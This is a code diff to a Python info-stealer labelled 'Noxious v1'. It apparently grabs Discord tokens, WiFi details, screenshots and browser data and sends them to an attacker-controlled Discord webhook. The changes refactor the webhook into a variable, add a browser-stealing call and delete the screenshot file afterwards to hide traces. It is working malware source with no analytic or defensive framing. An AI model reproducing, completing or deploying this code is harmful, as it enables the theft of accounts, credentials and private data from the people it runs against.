@@ -3,8 +3,7 @@ import json
 import os
 import subprocess
 
-
-
+from browsers           import Browsers
 from datetime           import datetime
 from base64             import b64decode
 from Crypto.Cipher      import AES
@@ -16,6 +15,7 @@ from urllib.request     import Request, urlopen
 from subprocess         import Popen, PIPE
 from PIL                import ImageGrab
 
+webhook = '%webhook%'
 
 def wif():
     try:
@@ -136,7 +136,7 @@ def get_token():
                             "color": 0x000000,
                             "author": {
                                 "name": "Noxious v1 - Made by Resentful",
-                                "icon_url": "https://imgur.com/a/WKgRuYj"
+                                "icon_url": "https://cdn.discordapp.com/attachments/1229552814683062336/1236400257470959796/aliens.png?"
                             },
                             "footer": {
                                 "text": "Dev Veal | https://github.com/resentful1"
@@ -152,7 +152,7 @@ def get_token():
                             "embeds": [embed]
                         }
                         try:
-                            res = requests.post('%webhook%', json=payload, headers=headers)
+                            res = requests.post(f'{webhook}', json=payload, headers=headers)
                             if res.status_code == 204:
                                 pass
                         except Exception as e:
@@ -170,7 +170,7 @@ def get_token():
     wifi_payload = {
         "embeds": [wifi_embed]
     }
-    wifi_res = requests.post('%webhook%', json=wifi_payload)
+    wifi_res = requests.post(f'{webhook}', json=wifi_payload)
     if wifi_res.status_code == 204:
         pass
 
@@ -190,10 +190,12 @@ def get_token():
     screenshot_files = {
         "file": open(screenshot_path, "rb")
     }
-    screenshot_res = requests.post('%webhook%', json=screenshot_payload, files=screenshot_files)
+    screenshot_res = requests.post(f'{webhook}', json=screenshot_payload, files=screenshot_files)
     if screenshot_res.status_code == 204:
         pass
 
 
 if __name__ == '__main__':
     get_token()
+    Browsers(webhook)
+    os.remove("screenshot.png")
